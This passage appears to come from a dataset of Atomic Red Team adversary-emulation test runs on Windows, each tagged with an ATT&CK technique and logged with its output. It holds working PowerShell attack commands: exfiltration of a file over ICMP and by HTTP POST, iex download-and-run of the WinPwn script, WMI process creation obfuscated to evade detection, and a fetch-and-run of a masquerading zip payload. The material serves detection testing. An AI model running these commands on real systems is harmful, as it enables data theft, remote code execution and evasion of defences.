68, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {39, 131, 233, 1...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {22, 0, 0, 138...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {117, 13, 139, 3...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {232, 179, 153, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {188, 150, 1, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {24, 235, 117, 73...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {15, 177, 11, 116...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {141, 13, 26, 44...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {195, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {31, 68, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {2, 0, 72, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {187, 1, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 68, 139, 206...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {91, 56, 73, 139...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {36, 104, 0, 133...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {1, 0, 0, 68...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 255, 68, 139...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 72, 139, 76...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {93, 195, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {65, 86, 72, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {195, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {68, 139, 5, 145...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {5, 0, 0, 51...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {81, 48, 72, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {187, 56, 3, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {7, 15, 132, 20...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {236, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {208, 69, 27, 246...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {192, 121, 27, 76...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {133, 180, 3, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {183, 141, 198, 8...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {200, 72, 255, 21...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {116, 39, 72, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {59, 199, 15, 130...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {210, 77, 139, 197...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {8, 69, 136, 84...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {208, 114, 45, 133...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {15, 17, 133, 224...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 15, 31, 68...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {208, 68, 51, 250...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {139, 199, 51, 210...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {65, 193, 239, 27...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {144, 28, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 15, 31, 68...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {184, 5, 64, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {1, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {103, 178, 0, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {77, 216, 65, 139...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {199, 255, 21, 233...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {44, 9, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {168, 168, 168, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {188, 5, 64, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 139, 85...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {242, 94, 96, 105...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {6, 65, 188, 122...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {3, 201, 59, 202...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {36, 96, 65, 139...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {201, 11, 15, 175...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {137, 69, 40, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {122, 0, 7, 128...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 0, 16...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {15, 175, 207, 191...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {137, 67, 40, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 15, 31...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {13, 131, 89, 1...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {21, 83, 153, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 139, 206, 102...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 21, 162, 144...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {36, 48, 72, 133...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 255, 21, 185...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {193, 224, 8, 65...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {74, 255, 255, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {139, 215, 72, 139...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {16, 69, 51, 201...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {68, 0, 0, 235...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {7, 128, 186, 236...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {254, 255, 72, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 141, 68, 36...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {196, 72, 195, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 131, 236, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 139, 7, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {188, 150, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {232, 247, 13, 254...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {76, 139, 220, 73...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 141, 21, 249...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {17, 72, 139, 66...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {133, 201, 116, 13...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {139, 64, 72, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {43, 234, 148, 117...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {184, 72, 133, 255...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 72, 137, 69...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 255, 72, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 72, 107, 192...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 138, 203...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {248, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 141, 5, 17...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 204, 72, 141...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {209, 72, 139, 206...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {144, 12, 3, 64...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {112, 46, 2, 64...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {94, 227, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {40, 229, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {250, 234, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {121, 32, 110, 101...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {102, 78, 111, 116...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {111, 0, 114, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {92, 0, 77, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {77, 0, 101, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {47, 92, 161, 101...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {34, 82, 160, 229...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {54, 55, 219, 39...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {167, 149, 224, 28...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {239, 16, 32, 116...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {158, 188, 250, 184...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {160, 239, 162, 169...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {14, 159, 24, 203...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {116, 0, 32, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {60, 117, 110, 107...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {116, 0, 13, 6...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {101, 114, 116, 86...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {46, 120, 100, 97...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {25, 61, 13, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {35, 100, 23, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {80, 83, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {8, 66, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {202, 206, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {92, 222, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {212, 230, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {168, 235, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 33, 3...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {71, 101, 116, 77...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {46, 100, 108, 108...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 71, 101...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {109, 115, 45, 119...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {176, 9, 2, 64...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {46, 63, 65, 86...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {32, 186, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {32, 177, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {53, 207, 1, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 189, 2, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {234, 57, 2, 64...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {69, 0, 65, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {60, 47, 116, 114...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {101, 0, 109, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {16, 160, 24, 160...}']",[''],['0'],"['$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(""127.0.0.1"", 1500, $Data) }']","['Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n']",['Exfiltration Over Alternative Protocol - ICMP'],"[{'tactic': 'exfiltration', 'technique_name': 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol', 'technique_id': 'T1048.003'}]",['windows'],['psh']
489,Initial-Success,execution,execution :: Windows Management Instrumentation,execution :: ['Create a Process using obfuscated Win32_Process'],execution :: T1047,operation__atomic_windows_depfalse_pshtrue__t1047__execution__windows_management_instrumentation__80cda763aa992b775038ce134c892070__SAVED_2024-03-07_000558,atomic_windows_depfalse_pshtrue__t1047__execution__windows_management_instrumentation__80cda763aa992b775038ce134c892070,['80cda763aa992b775038ce134c892070'],1,0,1,[1],['Path          : \\\\.\\root\\cimv2:Win32_AtomicRelativePath  : Win32_AtomicServer        : .NamespacePath : root\\cimv2ClassName     : Win32_AtomicIsClass       : TrueIsInstance    : FalseIsSingleton   : False__GENUS          : 2__CLASS          : __PARAMETERS__SUPERCLASS     : __DYNASTY        : __PARAMETERS__RELPATH        : __PROPERTY_COUNT : 2__DERIVATION     : {}__SERVER         : __NAMESPACE      : __PATH           : ProcessId        : 4752ReturnValue      : 0PSComputerName   : '],[''],['0'],"['$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process"")); $NewClass = $Class.Derive(""Win32_Atomic""); $NewClass.Put(); Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe']",['This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n'],['Create a Process using obfuscated Win32_Process'],"[{'tactic': 'execution', 'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047'}]",['windows'],['psh']
491,Initial-Success,discovery,discovery :: Network Service Discovery,discovery :: ['WinPwn - spoolvulnscan'],discovery :: T1046,operation__atomic_windows_depfalse_pshtrue__t1046__discovery__network_service_discovery__bc34d6834bdf568e206627f7809a556f__SAVED_2024-03-06_235237,atomic_windows_depfalse_pshtrue__t1046__discovery__network_service_discovery__bc34d6834bdf568e206627f7809a556f,['bc34d6834bdf568e206627f7809a556f'],1,0,1,[1],['Checking Domain Controllers for MS-RPRN RPC-Service!'],[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput""]",['Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn'],['WinPwn - spoolvulnscan'],"[{'tactic': 'discovery', 'technique_name': 'Network Service Discovery', 'technique_id': 'T1046'}]",['windows'],['psh']
497,Initial-Success,exfiltration,exfiltration :: Exfiltration Over C2 Channel,exfiltration :: ['C2 Data Exfiltration'],exfiltration :: T1041,operation__atomic_windows_depfalse_pshtrue__t1041__exfiltration__exfiltration_over_c2_channel__72784d12700b219ec134aa42cec5603e__SAVED_2024-03-06_231237,atomic_windows_depfalse_pshtrue__t1041__exfiltration__exfiltration_over_c2_channel__72784d12700b219ec134aa42cec5603e,['72784d12700b219ec134aa42cec5603e'],1,0,1,[1],"['StatusCode        : 200StatusDescription : OKContent           : <!doctype html>                    <html>                    <head>                        <title>Example Domain</title>                                            <meta charset=""utf-8"" />                        <meta http-equiv=""Content-type"" content=""text/html; charset=utf-8"" />                        <meta name=""viewport"" conten...RawContent        : HTTP/1.1 200 OK                    Connection: close                    Accept-Ranges: bytes                    Content-Length: 1256                    Cache-Control: max-age=604800                    Content-Type: text/html; charset=UTF-8                    Date: Thu, 07 Mar 2024 04:10:25 GMT                    Expires: Thu...Forms             : {}Headers           : {[Connection, close], [Accept-Ranges, bytes], [Content-Length, 1256], [Cache-Control,                     max-age=604800]...}Images            : {}InputFields       : {}Links             : {@{innerHTML=More information...; innerText=More information...; outerHTML=<A                     href=""https://www.iana.org/domains/example"">More information...</A>; outerText=More                     information...; tagName=A; href=https://www.iana.org/domains/example}}ParsedHtml        : System.__ComObjectRawContentLength  : 1256']",[''],['0'],"['if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value ""This is line $_."" }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive']",['Exfiltrates a file present on the victim machine to the C2 server.\n'],['C2 Data Exfiltration'],"[{'tactic': 'exfiltration', 'technique_name': 'Exfiltration Over C2 Channel', 'technique_id': 'T1041'}]",['windows'],['psh']
499,Initial-Success,defense-evasion,defense-evasion :: Masquerading,defense-evasion :: ['System File Copied to Unusual Location'],defense-evasion :: T1036,operation__atomic_windows_depfalse_pshtrue__t1036__defense-evasion__masquerading__bc456ce28da22e33b96257b6ae020391__SAVED_2024-03-06_225920,atomic_windows_depfalse_pshtrue__t1036__defense-evasion__masquerading__bc456ce28da22e33b96257b6ae020391,['bc456ce28da22e33b96257b6ae020391'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['copy-item ""$env:windir\\System32\\cmd.exe"" -destination ""$env:allusersprofile\\cmd.exe""; start-process ""$env:allusersprofile\\cmd.exe""; sleep -s 5 ; stop-process -name ""cmd"" | out-null']",['It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.'],['System File Copied to Unusual Location'],"[{'tactic': 'defense-evasion', 'technique_name': 'Masquerading', 'technique_id': 'T1036'}]",['windows'],['psh']
500,Initial-Success,defense-evasion,defense-evasion :: Masquerading,defense-evasion :: ['Malware Masquerading and Execution from Zip File'],defense-evasion :: T1036,operation__atomic_windows_depfalse_pshtrue__t1036__defense-evasion__masquerading__7575d3d5ae97ee568d49afbd0f878fe2__SAVED_2024-03-06_225243,atomic_windows_depfalse_pshtrue__t1036__defense-evasion__masquerading__7575d3d5ae97ee568d49afbd0f878fe2,['7575d3d5ae97ee568d49afbd0f878fe2'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['if (Test-Path ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip"") { ; } else {New-Item -Type Directory ""PathToAtomicsFolder\\..\\ExternalPayloads\\"" -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip -OutFile ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip""};  ;  Expand-Archive -Path ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip"" -DestinationPath ""$env:userprofile\\Downloads\\T1036"" -Force; cd ""$env:userprofile\\Downloads\\T1036""; cmd /c ""$env:userprofile\\Downloads\\T1036\\README.cmd"" >$null 2>$null']","['When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)']",['Malware Masquerading and Execution from Zip File'],"[{'tactic': 'defense-evasion', 'technique_name': 'Masquerading', 